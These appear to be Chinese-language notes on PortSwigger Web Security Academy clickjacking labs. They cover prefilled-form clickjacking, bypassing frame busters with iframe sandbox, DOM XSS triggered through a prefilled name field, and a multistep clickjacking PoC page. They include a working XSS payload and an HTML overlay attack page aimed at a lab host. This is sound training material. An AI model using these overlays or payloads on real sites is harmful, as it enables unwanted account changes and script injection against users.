## 带预填表单输入的点击劫持

实验：通过 URL 参数预填充表单输入数据实现点击劫持
https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input

一些需要填写和提交表单的网站允许在提交前使用 GET 参数预填充表单输入


请求账户页面
GET /my-account HTTP/2

响应为
```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required type="email" name="email" value="">
    <input required type="hidden" name="csrf" value="5GXCs8KOmZKulV9jWecdxQ2t629u8VFC">
    <button class='button' type='submit'> Update email </button>
</form>
```
此处 email 参数值可使用url参数设置
/my-account?email=qq@aa

使用burp的点击劫持概念验证工具
设置url参数后，进行更改邮件操作。
将生成的验证页面中的base64编码的url改为未使用的邮件地址


## iframe 破坏脚本

实验：使用框架破坏脚本进行点击劫持
https://portswigger.net/web-security/clickjacking/lab-frame-buster-script

攻击者针对框架破坏器的一个有效绕过方法是使用 HTML5 iframe 的 sandbox 属性。
当这个属性设置为 allow-forms 或 allow-scripts 值，并且省略了 allow-top-navigation 值时，框架破坏器脚本可以被中和，因为 iframe 无法检查它是否是顶层窗口

设置burp的点击劫持概念验证，启用沙盒模式并设置其参数值为allow-forms，否则显示此页面不可被框架



## 结合点击劫持与 DOM XSS 攻击

实验：利用点击劫持漏洞触发基于 DOM 的 XSS
https://portswigger.net/web-security/clickjacking/lab-exploiting-to-trigger-dom-based-xss

在提交反馈功能后，名字显示在页面中
其脚本代码为

```javascript
function submitFeedback(method, path, encoding, personal, data) {
    var XHR = new XMLHttpRequest();
    XHR.open(method, path);
    if (personal) {
        // 使用表单中 name 的属性值调用显示函数
        XHR.addEventListener("load", displayFeedbackMessage(data.get('name')));
    } else {
        XHR.addEventListener("load", displayFeedbackMessage());
    }
    if (encoding === "multipart/form-data") {
        XHR.send(data)
    } else {
        var params = new URLSearchParams(data);
        XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        XHR.send(params.toString())
    }
}

// name 的属性值进入显示函数
function displayFeedbackMessage(name) {
    return function() {
        var feedbackResult = document.getElementById("feedbackResult");
        if (this.status === 200) {
            // 汇
            feedbackResult.innerHTML = "Thank you for submitting feedback" + (name ? ", " + name : "") + "!";
            feedbackForm.reset();
        } else {
            feedbackResult.innerHTML =  "Failed to submit feedback: " + this.responseText
        }
    }
}
```

虽然响应的表单字段不包含value属性，但也可预填充


实验解决方案为：
name=<img src=1 onerror=print()>

若name的值
为单个 >
innerHTML 为 &gt;

若name的值
为单个 <
innerHTML 为 <!---->

若name的值
为 <img>
innerHTML 为 <img>

**innerHTML 不对完整标签进行转义**
**虽然预填充值在响应的value中被转义，但之后的脚本将其提取为字符再插入html结构中——相当于还原**

预填充url参数设置
name=<img+src%3d1+onerror%3dprint()>
预填充响应
<input required type="text" name="name" value="&lt;img src=1 onerror=print()&gt;">
脚本处理后
<img src="1" onerror="print()">

设置并请求预填充参数url
GET /feedback?name=<img+src%3d1+onerror%3dprint()>&email=bbbbb%40b&subject=cccccc&message=ddddddddd HTTP/2
点击提交表单按钮即触发 DOM XSS

## 多步骤点击劫持

实验：多步骤点击劫持
https://portswigger.net/web-security/clickjacking/lab-multistep

似乎要同时显示两个按钮才能通过lab
```html
<style>
	iframe {
		position:relative;
		width: 500px;
		height: 700px;
		opacity: 0.5;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:490px;
		left:50px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:205px; 
	}
</style>
<div class="firstClick" id="firstBtn">Click me first</div>
<div class="secondClick" id="secondBtn">Click me next</div>
<iframe src="https://0a5900a20470cc8d80d5357b007a00dc.web-security-academy.net/my-account"></iframe>
```
